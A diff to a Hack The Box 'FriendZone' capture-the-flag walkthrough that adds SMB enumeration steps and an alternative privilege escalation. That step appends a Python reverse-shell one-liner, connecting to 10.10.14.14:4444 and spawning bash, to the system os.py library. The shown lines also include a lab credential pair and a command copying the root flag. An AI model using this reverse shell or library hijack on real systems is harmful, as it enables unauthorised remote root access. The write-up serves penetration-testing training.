@@ -106,6 +106,10 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 
 
 ### smb
++ Fingerprint samba with crackmapexec: `crackmapexec smb 10.10.10.123`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/68f9687e-b288-4c0b-9b96-ba6209040aa9)
+
 + List available shares and permissions: `smbmap -H 10.10.10.123 `
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4c08c882-fdd7-4bae-9046-9639f94a64fb)
@@ -146,6 +150,17 @@ creds for the admin THING:
 
 admin:WORKWORKHhallelujah@#
 ```
+
++ **Alternatively**, try: `impacket-smbclient guest@10.10.10.123`
+```
+impacket-smbclient guest@10.10.10.123
+shares
+use general
+ls
+cat creds.txt
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/013cdba2-fa00-4399-a7a6-386e1617b7c3)
 
 + Try these credentials on ftp login and ssh login, but they don't work.
 
@@ -437,6 +452,10 @@ db_name=FZ
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a33af8f7-b88b-42fe-a2a0-c58cdb8842bd)
 
++ **Alternatively 2**, check writable directories: `find / -perm -222 -type d 2>/dev/null`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2b2abbfe-097a-4f70-97d3-7fcf38beaf3c)
+
 + Add the python reverse shell code to the bottom of the **os.py** file.
 + Remove **os** from **os.dup2()**, and just write **dup2()** since we're in the os module.
 + Check [Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) about more.
@@ -456,6 +475,11 @@ p=subprocess.call(["/bin/bash","-i"]);
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e2c438c4-2d5e-483e-827a-09978ffa7f41)
 
++ **Alternatively**, add the following one-liner standard reverse shell python script to the **os.py** file:
+```
+echo 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4444));dup2(s.fileno(),0);dup2(s.fileno(),1);dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);s.close()' >> /usr/lib/python2.7/os.py
+```
+
 + Start a netcat listener on the attack machine: `nc -lnvp 444`
 + Wait 2 minutes until to get the root shell.
 
@@ -466,7 +490,7 @@ p=subprocess.call(["/bin/bash","-i"]);
 + Taking privilege of python library, let's create a bogus python library named as os.py to call root flag through this file.
 ```
 cd /tmp
-echo "system ('cat /root/root.txt > /tmp/flag')" >> /usr/lib/python2.7/os.py
+echo "system ('cat /root/root.txt > /tmp/flag.txt')" >> /usr/lib/python2.7/os.py
 ```
 
 
@@ -475,10 +499,11 @@ echo "system ('cat /root/root.txt > /tmp/flag')" >> /usr/lib/python2.7/os.py
 + https://vvmlist.github.io/#FriendZone
 + https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/friendzone-writeup-w-o-metasploit
-+ https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/friendzoned
 + https://ethicalhacs.com/friendzone-hackthebox-walkthrough/
 + https://0xrick.github.io/hack-the-box/friendzone/
 + https://www.hackingarticles.in/hack-the-box-friendzone-walkthrough/
++ https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/friendzoned
++ https://rootissh.in/hackthebox-friendzone-walkthrough-htb-e438711443f7
 
 
 # Technical Knowledge
